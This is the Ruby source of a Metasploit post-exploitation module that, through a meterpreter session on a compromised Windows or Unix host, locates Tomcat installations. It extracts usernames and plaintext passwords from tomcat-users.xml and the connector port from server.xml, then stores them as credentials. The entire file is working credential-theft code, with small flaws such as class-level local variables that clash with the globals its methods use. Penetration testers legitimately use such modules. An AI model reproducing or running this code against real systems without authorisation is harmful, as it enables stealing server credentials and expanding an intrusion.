require 'rex'
require 'rexml/document'
require 'msf/core'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Services

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Gather Tomcat Credentials',
      'Description'   => %q{
        This module will attempt to collect credentials from Tomcat services running on the machine.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
        'Koen Riepe <koen.riepe@fox-it.com>', # Module author
      ],
      'Platform'      => [ 'win', 'linux' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

username = []
password = []
port = 0

  def report_creds(user, pass, port)
    return if (user.empty? or pass.empty?)
      # Assemble data about the credential objects we will be creating
      credential_data = {
        origin_type: :session,
        post_reference_name: self.fullname,
        private_data: pass,
        private_type: :password,
        session_id: session_db_id,
        username: user,
        workspace_id: myworkspace_id,
      }

      credential_core = create_credential(credential_data)

      if not port.is_a? Integer
        print_status("Port not an Integer")
        port = 8080
      end

      login_data = {
            core: credential_core,
            status: Metasploit::Model::Login::Status::UNTRIED,
            address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
            port: port,
            service_name: 'Tomcat',
            protocol: 'tcp',
            workspace_id: myworkspace_id
        }

        create_credential_login(login_data)
  end

  def os_check()
    os  = ""
    if exist?("/etc/passwd")
      os =  "unix"
    else
      os = "win"
    end
    return os
  end

  def gatherwin()
    print_status("Windows OS detected, enumerating services")
    service_list.each do |service|
      if service[:name].downcase().include? "tomcat"
        print_good("Tomcat service found")
        tomcat_home = service_info(service[:name])[:path].split("\\bin\\")[0]
        conf_path = tomcat_home.split('"')[1] + "\\conf\\tomcat-users.xml"

        if exist?(conf_path)
          print_status("tomcat-users.xml found")
          xml = read_file(conf_path).split("\n")

          comment_block = false
          xml.each do |line|
            if line.include? "<user username=" and not comment_block
              $username.push(line.split('<user username="')[1].split('"')[0])
              $password.push(line.split('password="')[1].split('"')[0])
            elsif line.include? ("<!--")
              comment_block = true
            elsif line.include? ("-->") and comment_block
              comment_block = false
            end
          end
        end

        port_path = tomcat_home.split('"')[1] + "\\conf\\server.xml"
        if exist?(port_path)
          xml = read_file(port_path).split("\n")
        end
        comment_block = false
        xml.each do |line|
          if line.include? "<Connector" and not comment_block
            $port = line.split('<Connector port="')[1].split('"')[0].to_i
          elsif line.include? ("<!--")
            comment_block = true
          elsif line.include? ("-->") and comment_block
            comment_block = false
          end
        end
      end
    end
  end

  def gathernix()
    print_status("Unix OS detected")
    user_files = cmd_exec('locate tomcat-users.xml').split("\n")
    user_files.each do |path|
      if exist?(path)
          print_status("tomcat-users.xml found")
          xml = read_file(path).split("\n")

          comment_block = false
          xml.each do |line|
            if line.include? "<user username=" and not comment_block
              $username.push(line.split('<user username="')[1].split('"')[0])
              $password.push(line.split('password="')[1].split('"')[0])
            elsif line.include? ("<!--")
              comment_block = true
            elsif line.include? ("-->") and comment_block
              comment_block = false
            end
          end
        end
    end

    port_path = cmd_exec('locate server.xml').split("\n")
    port_path.each do |path|
      if exist?(path)
          xml = read_file(path).split("\n")
          comment_block = false
          xml.each do |line|
            if line.include? "<Connector" and not comment_block
              $port = line.split('<Connector port="')[1].split('"')[0].to_i
            elsif line.include? ("<!--")
              comment_block = true
            elsif line.include? ("-->") and comment_block
              comment_block = false
            end
          end
      end
    end
  end

  def run()
    if os_check() == "win"
      gatherwin()
    else
      gathernix()
    end

  i=0
  while i < $username.count
    report_creds($username[i],$password[i],$port)
    i+=1
  end

  $username = []
  $password = []
  $port = 0

  end

end
